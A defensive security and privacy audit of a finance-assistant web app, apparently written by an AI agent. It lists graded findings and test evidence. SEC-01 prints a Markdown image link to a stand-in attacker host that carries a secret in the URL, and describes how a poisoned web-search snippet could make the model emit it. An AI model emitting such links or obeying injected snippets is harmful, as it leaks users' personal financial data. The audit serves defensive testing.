# ARIA security and privacy audit (Phase A)

Date: 2026-11-02. Defensive, in-process only (FastAPI `TestClient`, scratch SQLite per run, synthetic accounts). Tree: branch `fix/plain-markdown-replies` at `530f001` plus other sessions' uncommitted edits. No application code was changed.
Labels: VERIFIED (evidence given), SUSPECTED, RECOMMENDATION, UNTESTED, BLOCKED.

## 1. Summary

* No P0 found. No critical issue to report immediately.
* VERIFIED: QA-AUTH-001 (content-type bypass of the owner check) is **fixed in HEAD** (`530f001`, committed 16:51 today while this audit was running). `api/auth.py:325-337` now parses any non-GET JSON body regardless of header spelling. `ARIA_EVALUATION/tests/api/test_authz_accounts.py`: 11 pass, 3 fail (QA-AUTH-002/003/004, still open). My own tests on the same bypass class for other write paths (`/api/transactions/sample`, `/api/chat/clear`, `Application/JSON` and `application/JSON; charset=utf-8`) pass against HEAD. The QA report's QA-004 and QA-005 are also addressed by that commit (per its message; I did not re-run those tests).
* VERIFIED good: the account-mode authorization model held in every probe I wrote. 31 read/write requests naming another account (query, body, duplicated parameters, path ids, audio tokens, report ids, WebSocket) were refused; the victim's profile, transactions, chat and report were unchanged. Sessions are hashed at rest, cookies are HttpOnly/SameSite=Strict (+Secure under an https origin), Origin is checked exactly on every state change, Google claims (nonce, aud, iss, email_verified, exp) are all enforced, SQL is parameterised, the audio token is a 32-hex allow-list, uploads are tightly bounded, report HTML is escaped, prompt-injection fences exist.
* Result of my suite: `ARIA_EVALUATION/tests/security`: **57 tests, 43 pass, 14 fail**. The 14 failures are the defects below (each asserts the secure behaviour).
* Headline findings (all P2/P3):
  * SEC-01 P2: model output is rendered as Markdown with remote images, so a prompt-injected model can exfiltrate profile/question text by image URL; there is no CSP to stop it.
  * SEC-02 P2: 16 idle WebSockets make every request, including `/api/health`, return 503 (private mode: unauthenticated).
  * SEC-03 P2: privacy deletion is cosmetic: "delete" and "clear" keep the text; profile delete leaves chats and reports; no account deletion; no export; no purge job.
  * SEC-04 P2: private mode (the image's default) has no authentication, accepts writes from any web origin, and its bearer id travels in URLs and access logs.
  * SEC-05 P2 (only when sign-up is on): registration needs no proof of email ownership (pre-account-takeover).
  * SEC-06..09 P3: no security headers; `/docs` and `/openapi.json` public in accounts mode; sign-up enumerates emails; unvalidated model/web URLs.

Re-run: `cd E:\ARIA; OMP_NUM_THREADS=2 MKL_NUM_THREADS=2 python -m pytest ARIA_EVALUATION/tests/security -q -p no:cacheprovider` (about 30 s; the interpreter lingers a few minutes afterwards on background TTS threads). Files: `ARIA_EVALUATION/tests/security/conftest.py` (blank provider keys and SMTP host, `ARIA_WEB_SEARCH=0`, non-loopback sockets blocked, `mock_llm` autouse, scratch DB), `test_security_audit.py`. `tests/security/sec_probe.py` is an older live-server probe by another session; I did not run it.

Scope notes: no external provider call, no network, no browser, no microphone, no server started (port 8015 unused). `data/user_profiles/*.db` was not opened (only `ls` of file names and sizes). Two throwaway Node files were created in `web/` to render Markdown/URL cases and deleted at once (`git status web` is clean).

## 2. Findings (defects)

### SEC-01 (P2, VERIFIED mechanism, SUSPECTED end-to-end): remote Markdown images in model output are rendered; exfiltration channel under prompt injection
* Component: `web/src/components/chat/Markdown.tsx` (and `versions/v1`), `modules/qa/lookup.py:web_answer`, `modules/qa/focus.py`, `shared/websearch.py`.
* Evidence: (a) `renderToStaticMarkup(<ReactMarkdown remarkPlugins={[remarkGfm]}>![x](https://evil.example/p.png?d=SECRET)</ReactMarkdown>)` with the installed react-markdown 10.x returns `<img src="https://evil.example/p.png?d=SECRET" alt="x"/>` (scratch `md.mjs`). The comment above the component says "no raw HTML, no images"; raw HTML and `javascript:`/`data:` links are blocked (verified), images are not. (b) `test_se02`: with a poisoned web-search snippet and a stub model that obeys it, `lookup.web_answer` returns the `![x](https://evil.example/...)` and `[more](https://evil.example/)` text unchanged in `response`. (c) `test_se01` (passes): the snippet does reach the model, inside `UNTRUSTED_CONTEXT_JSON`, with the "never follow instructions" rule 6, so the defence is instruction-only. (d) No CSP exists (SEC-06), so the browser fetches the image. Web search is on by default (`ARIA_WEB_SEARCH` default `1`) and fires for any unlisted-name data question; news headlines (`system_context`) are also untrusted text.
* Not shown: that a real model obeys such an injection (UNTESTED, no provider calls allowed). The model has no tools (grep: no `tools=`), so the blast radius is answer content and this image/link channel. What can leak is whatever is in the prompt: the question, recent history, profile facts on personal questions.
* Why it matters: zero-click data exfiltration and phishing links in the answer of a finance assistant.
* Fix: `<ReactMarkdown disallowedElements={['img']} unwrapDisallowed>` (or `components={{ img: () => null }}`), render links with `rel="noopener noreferrer" target="_blank"` and only for hosts present in the answer's `sources`; strip `![...](...)` and non-source URLs in `modules/qa/trust.py`; add CSP `img-src 'self' data:` (SEC-06).
* Regression risk: low; the UI uses no inline images from the model (grep of `web/src` shows no dependence).

### SEC-02 (P2, VERIFIED): idle WebSockets starve the whole server
* Component: `api/resource_limits.py:39-56`, `api/routes/live.py:175-218`.
* Evidence: `test_sc04_idle_websockets_cannot_starve_the_server`: 16 `/api/live/ws` connections, then `GET /api/health` returns 503. A socket counts toward `max_active` (16) for its whole lifetime and `live_socket` waits on `receive_json()` with no idle timeout. The 120/min POST bucket counts the handshake once per socket, so 16 sockets fit in one minute from one IP.
* Who can do it: private mode: anyone who can reach the port, unauthenticated. Accounts mode: any signed-in account (sign-up is closed by default, `test_sc03` confirms anonymous and foreign-Origin sockets are refused).
* Fix: do not count WebSockets in `active` (cap them separately, e.g. 4 per peer/account and 64 total); add an idle timeout (`asyncio.wait_for(ws.receive_json(), 60)` with ping) and a maximum session length.
* Regression risk: low to medium; check the live-meeting specs and `tests/test_live_avatar.py`.

### SEC-03 (P2, VERIFIED): deletion and "clear" do not delete; no account deletion or export; no purge job
* Component: `shared/conversation_history.py:delete`, `shared/conversation_memory.py:clear` (line 38 comment: "stay ... until purged"; grep finds no purge anywhere), `api/routes/profile.py:delete_profile`, absence of any account route.
* Evidence: `test_sp01` (after `DELETE /api/conversations/{id}` the question and answer text remain in `chat_turns`), `test_sp02` (`/api/chat/clear` only advances `cleared_through`), `test_sp03` (after `DELETE /api/profile`, the owner's conversations and saved research reports remain: `{'conversations': 2, 'reports': 1}`), `test_sp04` (the OpenAPI surface has no account-deletion or whole-account export endpoint). Learning state, `conversation_style` (deleted by profile delete), `chat_embeddings` (content-hash keyed, no text) are secondary.
* Mitigating: the Disclaimers page (`DisclaimersPage.tsx:220-247`) says honestly that clearing "does not necessarily erase the underlying archive". It does not mention web search (DuckDuckGo/Bing receive the first 200 characters of an unlisted-name question), no retention period, and no way to ask for deletion.
* Why it matters: users type salary, EMIs and goals. A user who deletes a chat or their profile believes the data is gone. RECOMMENDATION: confirm with counsel what India's DPDP Act 2023 requires (erasure, access) before a public launch.
* Fix: hard-delete turns for a deleted conversation (and its audio artefacts), make `/api/profile` DELETE (or a new `DELETE /api/account`) remove conversations, reports, style, learning rows, audio and previews for the owner, add `GET /api/account/export` (JSON of profile, transactions, conversations, reports), add a nightly purge of soft-deleted rows older than N days, document retention.
* Regression risk: medium (data loss is the intent; the "writing to a deleted chat revives it" behaviour, `conversation_memory.py:209`, must be decided first).

### SEC-04 (P2, VERIFIED): private mode has no authentication, accepts cross-origin writes, and its bearer id is in URLs and logs
* Component: `api/auth.py:299-302`, `api/main.py:39-45` (CORS `*` in private mode), `Dockerfile` (`ARIA_BIND_HOST=0.0.0.0`, no `ARIA_AUTH_MODE`; only `docker-compose.yml` defaults to `accounts`), `api/routes/research.py` (owner id in the query string for iframe/download links).
* Evidence: `test_sa04`: in private mode a `POST /api/profile` with `Origin: https://evil.example` returns 200. `docs/DEPLOYMENT.md:8` warns "Use accounts mode for anything reachable from the internet", but a plain `docker run aria` is an open, 0.0.0.0-bound, login-less deployment. In private mode `owner_id`/`session_id` is the only credential (a random UUID from `localStorage`, `web/src/api.ts:46-52`) and the server accepts any string, including short guessable ones. Access logs record it: `logs/api.out.log` has 315 lines containing `owner_id=` and the root `api.out.log` 47 lines with `session_id=` (counts only; both files are gitignored).
* Fix: default `ARIA_AUTH_MODE=accounts` in the Dockerfile; refuse to start in private mode when `ARIA_BIND_HOST` is not loopback unless `ARIA_ALLOW_OPEN=1`; in private mode require an `Origin`/`Host` of localhost on writes (stops drive-by pages and DNS rebinding); mint owner ids server-side or enforce length >= 32; redact query strings in the access log.
* Regression risk: medium (Playwright specs and local launchers use private mode; they send the dev origin).

### SEC-05 (P2 when sign-up is enabled, default is off; VERIFIED): registration gives a session without proof of email ownership
* Component: `api/auth.py:167-183`, `/google` at 237-255.
* Evidence: `test_sb07`: `POST /api/auth/register` for an address the caller does not own returns 200 and a signed-in session. Consequence (code path): the unique email constraint then makes the real owner's Google sign-in fail with 409 ("Sign in with your password first"), and any data the real owner enters is in an account the squatter has the password to (pre-account-takeover). Google linking is safe (requires `email_verified`, nonce, same email).
* Fix: send a verification link (SMTP code already exists in `feedback.py`) and issue a session only after it is used; or allow only Google sign-up; or invite codes while testers are onboarded.
* Regression risk: medium (sign-up flow and `web/e2e-accounts`).

### SEC-06 (P3, VERIFIED): no security response headers
* Evidence: `test_sa02` and `test_sd06`: `/api/health` and report HTML carry none of `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy` (HSTS is the proxy's job). The report page is opened top-level in a new tab (only the in-app preview uses `sandbox=""`). Escaping of third-party text in the report is correct (`test_sd05` injects script/img/svg payloads through company name, summary, officers, news title and source: raw payloads absent), so this is defence in depth, but it is also what would have contained SEC-01 and clickjacking of `/avatar/live`.
* Fix: a 10-line middleware: `default-src 'self'; img-src 'self' data: blob:; connect-src 'self'; frame-ancestors 'self'` (the Google sign-in script and the TalkingHead assets need allow-list entries; test in the live-meeting spec), `nosniff`, `Referrer-Policy: no-referrer`, and a stricter `default-src 'none'; style-src 'unsafe-inline'` for `/api/research/reports/*/html`.
* Regression risk: medium for the CSP (inline scripts in `live.html`/`avatar.html`), low for the other three.

### SEC-07 (P3, VERIFIED): `/docs`, `/redoc`, `/openapi.json` are public in accounts mode
* Evidence: `test_sa01` x3 return 200 without a cookie. FastAPI registers them outside the app-wide `authorize` dependency. Harmless for data, but it gives an attacker the full route and schema list.
* Fix: `FastAPI(docs_url=None, redoc_url=None, openapi_url=None)` when `ARIA_AUTH_MODE=accounts`. Regression risk: none for the UI.

### SEC-08 (P3, VERIFIED): sign-up reveals whether an email exists
* Evidence: `test_sb06`: first register 200, second 409 "This account cannot be created". Login is uniform (`test_sb05` passes: identical status and body for wrong password and unknown user; dummy hash equalises timing in code, timing UNTESTED). Only relevant while sign-up is on. Fix: send the same response and an email either way (needs SEC-05's mail flow). Regression risk: low.

### SEC-09 (P3, RECOMMENDATION and SUSPECTED): unvalidated URLs from RSS/web search
* Evidence: `shared/news.py:185-195` and `shared/websearch.py` accept any `link` (websearch filters `startswith("http")`, news does not). The UI renders `item.url` in `NewsFeed.tsx:179`. VERIFIED mitigation: React 19.2.8 rewrites `javascript:` hrefs to a throwing stub (SSR render), and react-markdown blanks `javascript:`/`data:` link targets. So not exploitable today; a server-side `http(s)` allow-list is cheap insurance. Also the `Sources:` line in `web_answer` prints search-result URLs verbatim into the answer.
* Regression risk: none.

### SEC-10 (P3, SUSPECTED): cost and CPU exhaustion by any signed-in user (or anyone in private mode)
* Evidence (code): the only throttle is 120 POST/min per socket peer, bucket shared per IP, GETs unlimited. Each chat/report/regenerate can spend LLM quota (the project already hit a Groq daily cap during the benchmark) and a login attempt on an unseen email costs one PBKDF2-600k (`login` runs the dummy hash); `_throttle` is keyed by email only, so many distinct emails each get 10 free attempts (extends QA-AUTH-002). Not load-tested (UNTESTED).
* Fix: per-account daily LLM budget and per-account chat rate; per-IP login limit in addition to per-email. Regression risk: low.

## 3. Areas checked and found sound (VERIFIED unless stated)

| Area | Evidence |
|---|---|
| Owner/session isolation, accounts mode | `test_sc01` 31 requests refused (profile, summary, transactions, insights, chat history/clear, conversations list/messages/export, reports get/html/download/delete/regenerate, audio, avatar render, duplicate `owner_id`/`session_id` in either order); victim data unchanged. `test_sc02`, `test_sc02b` (body and query smuggling with odd content types) pass on HEAD |
| CSRF / Origin | `test_sb02`: missing, `null`, sibling-domain, port-suffixed, upper-case and trailing-slash origins all 403 on POST. Cookie `SameSite=Strict`, `HttpOnly`, `Secure` under https (`test_sb01`); plain-http non-loopback origin is refused at config time (`test_sb01b`) |
| CORS in accounts mode | `test_sa03` (fresh process): foreign origin gets no `Access-Control-Allow-Origin`; exact app origin gets it with credentials |
| Sessions | token 43 chars, only its SHA-256 stored, PBKDF2-SHA256 600 000 iterations, stolen cookie dead after logout, expiry enforced (`test_sb03`, `test_sb04`); 9-session cap and 7-day lifetime by code |
| Google sign-in | `test_sb08`, `test_sb09`: unconfigured fails closed (503); wrong nonce, audience, issuer, unverified or string-typed `email_verified`, expired token, and a replayed nonce are all 401; valid claims accepted. The signature check (`verify_oauth2_token`) is stubbed, so real Google verification is UNTESTED/BLOCKED (network) |
| WebSocket auth | `test_sc03`: anonymous, foreign Origin and mismatched `owner_id` are closed (1008) |
| SQL injection | `test_sd01`: quotes, `UNION`, `%`, `_`, backslash, `DROP TABLE` in every string input return nothing extra and the table survives. Code: all queries are ORM or bound `text()`; no f-string SQL (grep) |
| Path traversal | `test_sd02` (audio token: dots, encoded dots, backslash, wrong length/case) 404/422; `test_sd03` six traversal spellings against the static mount never return `api/auth.py`; downloads use a sanitised stem (`research.py:143`) |
| Header injection | `test_sd04`: titles with quotes, CRLF, `../`, `;`, `%0d%0a` yield one well-formed `Content-Disposition`, no extra header |
| XSS | `test_sd05` report HTML escapes company, summary, officers, news; markdown rendering blocks raw HTML (`<script>`, `<img onerror>` rendered as text) and `javascript:`/`data:` links; `ResearchTab` previews in `sandbox=""` |
| Live meeting iframe / postMessage | read: `LiveMeeting.tsx:42,66` and `interface/avatar/live.html:122,857` post only to `location.origin` and reject messages whose `origin`, `source` (the exact frame) or `source` tag differ; DOM text uses `textContent`. Browser run UNTESTED |
| Uploads | `test_sf01`: wrong extension 415, 5 MB cap 413, corrupt xlsx/pdf 415/422, 60 MB-expanding xlsx zip bomb refused in under 10 s, formula-style cell text returned as JSON data, traversal filename harmless (name never used as a path); `test_sf02`: 13 MB JSON body 413 before parsing, 11 MB audio refused; `test_sf03`: a preview import id cannot be used by another owner. Code limits: 20 000 rows, 100 PDF pages, 2 000 zip members |
| Prompt-injection design | fences and rules exist (`agents.py:_untrusted` strips `<`/`>`, `focus.py` rule 6, `conversation_memory.py:419`, `shared/dialogue.py`); `test_se01` shows snippets arrive labelled untrusted; `test_se03`: a poisoned message stored by user A never appears in user B's prompts across three follow-up phrasings. Client-supplied `history` with role `system` does not reach the model (`test_se04`) |
| Logs and errors | `test_sg01`: neither the question text nor a profile amount is written to the application log (only `qlen`); `test_sg02`: the 500 body has no traceback, path or exception name. Key-shaped strings (`gsk_`, `AIza`, `hf_`, `ghp_`, `sk-`) appear in neither working logs nor git history (`git log -G`); `.env` is gitignored and untracked, `.env.example` holds variable names only |
| Feedback endpoint | by code: Origin check even in private mode, header-injection filters, 5 per 10 min per peer, no internals in errors |

## 4. Privacy inventory (what is stored, where it goes)

* VERIFIED by code, stored in one SQLite/Postgres DB (`DB_URL`, default `data/user_profiles/aria.db`, plaintext, no encryption at rest): accounts (email, password hash, Google `sub`), auth sessions (token hash), financial profile (income, expenses, loans, assets, risk label), transactions (merchant, amount, channel), statement previews (10 minutes, pruned only on the next parse or import), conversations and every turn (question and answer JSON, ratings), conversation style/episodes, learning state, saved research reports, forecast runs, expiring audio artefacts (1 hour TTL, 128 files, files under `audio-cache/`). The uploaded statement file itself is never stored (`transactions.py` docstring; code agrees).
* Leaves the machine (by code and the Disclaimers page): question plus context to Groq/Gemini; spoken reply text to Microsoft Edge TTS (normal chat voice and Piper fallback); unlisted-name questions (first 200 characters) to DuckDuckGo/Bing unless `ARIA_WEB_SEARCH=0`; company names to Yahoo Finance, Screener.in, Google News/RSS publishers; feedback via the operator's SMTP; Google sign-in script and token check. Web search is not mentioned in the privacy text (SEC-03).
* Retention: no schedule; soft-deleted data kept indefinitely; expired auth/throttle/preview/audio rows are pruned opportunistically on later requests.
* User controls today: clear chat, delete conversation, delete profile (profile, style, transactions, previews only), logout-all. Absent: account deletion, whole-account export, retention setting. Per-conversation export exists (JSON/Markdown).
* RECOMMENDATION: encrypt or at least file-permission the DB and `audio-cache`; keep backups under the same deletion policy; add `Cache-Control: no-store` to API responses carrying personal data (only auth and feedback set it).

## 5. Dependency risk (names and versions only)

* BLOCKED: `pip-audit 2.10.1` is installed but needs the network (OSV/PyPI), `npm audit` likewise; neither was run. `requirements-security.txt` records a pip-audit pass on 2026-10-16 with minimum patched transitive versions.
* Installed backend versions (VERIFIED, `pip list`): fastapi 0.143.2, starlette 1.4.0, uvicorn 0.34.0, python-multipart 0.0.31, SQLAlchemy 2.0.49, pydantic 2.13.0, pypdf 6.19.0, openpyxl 3.1.5, xlrd 2.0.2, requests 2.34.2, urllib3 2.8.0, beautifulsoup4 4.14.3, google-auth 2.56.3, cryptography 50.0.0, aiohttp 3.14.3, torch 2.13.0, setuptools 83.0.0. Frontend (package.json ranges): react ^19.2.8, react-markdown ^10.1.0, remark-gfm ^4.0.1, recharts ^3.10.1, vite ^8.2.0, lightweight-charts ^5.2.1. I make no claim about their CVE status.
* RECOMMENDATION: run both audits in CI on a schedule with network (QA report R7). `xlrd 2.0.2` and `pypdf` parse untrusted uploads, so keep them current. No lock file for Python (`requirements.txt` pins direct dependencies only).

## 6. Not tested, and why

* Real LLM obedience to injection, real STT/TTS, Groq/Gemini behaviour: forbidden (no provider calls).
* Real Google token verification and the Google script: needs network (BLOCKED); only the post-verification claim logic was tested.
* `pip-audit` / `npm audit`: BLOCKED (network).
* Browser behaviour: XSS in the live DOM, the real iframe/postMessage exchange, the Markdown render inside the app (I rendered the same library server-side), clickjacking, CSP effects. No browser per constraints; UNTESTED.
* A live server over real HTTP: header framing, proxy headers, TLS, `Secure` cookie on a real HTTPS connection (simulated through `TestClient` with an https base URL), uvicorn access-log format (counted existing logs instead), real concurrency and load for rate limits (SEC-10 is SUSPECTED).
* Timing side channels of login (only code reading), PBKDF2 CPU cost under many distinct emails.
* Postgres (only SQLite scratch DBs); the `/api/research/validation` and `/scenario-backtest` routes (they are explicitly refused in accounts mode, `auth.py:320`); `/api/quiz/answer` and `/api/progress` cross-owner reads beyond the namespaced learning key (by code the key includes the authenticated account id); the `/v1/*`, `/embed` and `/api/tavus/*` routes listed in `API_INVENTORY.md` are not mounted in this tree (`grep` finds no handler under `api/`), so they are absent, not tested.
* Reports from other agents' uncommitted edits (`core/orchestrator.py`, `core/intent/arch.py`) were not reviewed for security.
